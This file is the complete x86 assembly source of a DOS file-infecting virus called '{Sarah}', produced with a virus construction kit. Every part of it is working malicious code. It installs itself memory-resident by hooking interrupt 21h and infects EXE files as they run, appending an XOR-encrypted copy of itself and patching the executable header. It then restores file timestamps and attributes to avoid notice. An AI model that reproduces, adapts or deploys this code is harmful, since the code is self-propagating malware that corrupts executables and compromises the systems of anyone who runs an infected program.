; sarah.asm : {Sarah} by Gehenna
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file sarah.cfg

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    0                      ; For easy calculation of offsets
id = 'EF'                               ; ID word for EXE infections

startvirus:
decrypt:                                ; handles encryption and decryption
patch_startencrypt:
          mov  bx,offset startencrypt   ; start of decryption
          mov  si,(offset heap - offset startencrypt)/2 ; iterations
decrypt_loop:
          db   2eh,81h,37h              ; xor word ptr cs:[bx], xxxx
decrypt_value dw  0                     ; initialised at zero for null effect
          inc  bx                       ; calculate new decryption location
          inc  bx
          dec  si                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          push ds
          push es

          mov  ax,'DA'                  ; Installation check
          int  21h
          cmp  ax,'PS'                  ; Already installed?
          jz  done_install

          mov  ax, es                   ; Get PSP
          dec  ax
          mov  ds, ax                   ; Get MCB

          sub  word ptr ds:[3],(endheap-startvirus+15)/16+1
          sub  word ptr ds:[12h],(endheap-startvirus+15)/16+1
          mov  ax,ds:[12h]
          mov  ds, ax
          inc  ax
          mov  es, ax
          mov  byte ptr ds:[0],'Z'      ; Mark end of chain
          mov  word ptr ds:[1],8        ; Mark owner = DOS
          mov  word ptr ds:[3],(endheap-startvirus+15)/16 ; Set size

          push cs
          pop  ds
          xor  di,di                    ; Destination
          mov  cx,(heap-startvirus)/2+1 ; Bytes to zopy
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          rep  movsw

          mov  di,offset encrypt
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          mov  cx,startencrypt-decrypt
          rep  movsb
          mov  al,0c3h                  ; retn
          stosb

          xor  ax,ax
          mov  ds,ax
          push ds
          lds  ax,ds:[21h*4]            ; Get old int handler
          mov  word ptr es:oldint21, ax
          mov  word ptr es:oldint21+2, ds
          pop  ds
          mov  word ptr ds:[21h*4], offset int21 ; Replace with new handler
          mov  ds:[21h*4+2], es         ; in high memory
done_install:
          pop  es
          pop  ds
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+oldCSIP+2],ax
          add  ax,word ptr cs:[bp+oldSSSP+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+oldSSSP]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
oldCSIP   dd 0fff00000h                 ; Needed for carrier file
oldSSSP   dd ?                          ; Original SS:SP

virus     db '{Sarah}',0
author    db '<Gehenna>',0

int21:                                  ; New interrupt handler
          cmp  ax,'DA'                  ; Installation check?
          jnz  notinstall
          mov  ax,'PS'
          iret
notinstall:
          pushf
          push ax
          push bx
          push cx
          push dx
          push si
          push di                       ; don't need to save bp
          push ds
          push es
          cmp  ax,4b00h                 ; Infect on execute
          jz   infectDSDX
exithandler:
          pop  es
          pop  ds
          pop  di
          pop  si
          pop  dx
          pop  cx
          pop  bx
          pop  ax
          popf
          db 0eah                       ; JMP SSSS:OOOO
oldint21  dd ?                          ; Go to orig handler

infectDSDX:
          mov  ax,4300h
          int  21h
          push ds
          push dx
          push cx                       ; Save attributes
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx

          mov  ax,5700h                 ; Get creation date/time
          int  21h
          push cx                       ; Save date and
          push dx                       ; time

          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          mov  ah,3fh                   ; Read file to buffer
          mov  dx,offset buffer         ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ax,4202h                 ; Go to end of file
          xor  cx,cx
          cwd
          int  21h

          mov  word ptr filesize,ax
          mov  word ptr filesize+2,dx
checkEXE:
          cmp  word ptr buffer+10h,id   ; is it already infected?
          jnz  infect_exe
done_file:
          mov  ax,5701h                 ; Restore creation date/time
          pop  dx                       ; Restore date and
          pop  cx                       ; time
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          pop  cx
          pop  dx
          pop  ds                       ; Restore filename
          call attributes               ; attributes

          jmp  exithandler
infect_exe:
          mov  cx, 1ah
          push cx
          push bx                       ; Save file handle
          les  ax,dword ptr buffer+14h  ; Save old entry point
          mov  word ptr oldCSIP, ax
          mov  word ptr oldCSIP+2, es

          les  ax,dword ptr buffer+0Eh  ; Save old stack
          mov  word ptr oldSSSP,es
          mov  word ptr oldSSSP+2,ax

          mov  ax,word ptr buffer+8     ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax,dword ptr filesize    ; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr buffer+14h, dx  ; New entry point
          mov  word ptr buffer+16h, ax

          mov  word ptr buffer+0Eh, ax  ; and stack
          mov  word ptr buffer+10h, id

          pop  dx                       ; get file length
          pop  ax
          pop  bx                       ; Restore file handle

          add  ax, heap-startvirus      ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr buffer+4, dx    ; new file size
          mov  word ptr buffer+2, ax

          push cs                       ; restore ES
          pop  es

          mov  ax,word ptr buffer+14h   ; needed later
finishinfection:
          add  ax,offset startencrypt-offset decrypt
          mov  word ptr encrypt+(patch_startencrypt-startvirus)+1,ax

get_encrypt_value:
          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          or   dx,dx                    ; Check if encryption value = 0
          jz   get_encrypt_value        ; Get another if it is
          mov  word ptr encrypt+(decrypt_value-startvirus),dx ; New encrypt. value
          xor  si,si                    ; copy virus to buffer
          mov  di,offset zopystuff
          mov  cx,heap-startvirus
          rep  movsb

          mov  si,offset encrypt        ; copy encryption function
          mov  di,offset zopystuff
          mov  cx,startencrypt-decrypt
          rep  movsb

          mov  word ptr [encrypt+(patch_startencrypt-startvirus)+1],offset zopystuff+(startencrypt-decrypt)

          push bx
          call encrypt
          pop  bx

          mov  ah,40h                   ; Concatenate virus
          mov  dx,offset zopystuff
          mov  cx,heap-startvirus       ; # bytes to write
          int  21h

          mov  ax,4200h                 ; Move file pointer
          xor  cx,cx                    ; to beginning of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Write to file
          mov  dx,offset buffer         ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          jmp  done_file

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          int  21h
          ret

heap:                                   ; Variables not in code
filesize  dd ?
encrypt:  db startencrypt-decrypt+1 dup (?)
zopystuff db heap-startvirus dup (?)    ; Encryption buffer
buffer    db 1ah dup (?)                ; read buffer
endheap:                                ; End of virus
end       startvirus
